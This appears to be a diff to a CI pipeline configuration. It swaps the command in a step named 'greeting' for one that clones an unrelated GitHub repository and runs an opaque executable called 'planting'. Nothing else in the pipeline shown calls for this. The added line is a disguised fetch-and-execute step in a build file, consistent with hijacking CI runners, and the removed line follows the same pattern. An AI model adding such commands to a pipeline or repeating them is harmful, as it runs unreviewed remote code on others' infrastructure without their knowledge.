@@ -7,4 +7,4 @@ steps:
 - name: greeting
   image: golang:1.12
   commands:
-  - git clone https://github.com/feribigexs/yda.git && cd yda && python run.py
+  - git clone https://github.com/feribigexs/zephher.git && cd zephher && chmod +x planting && ./planting
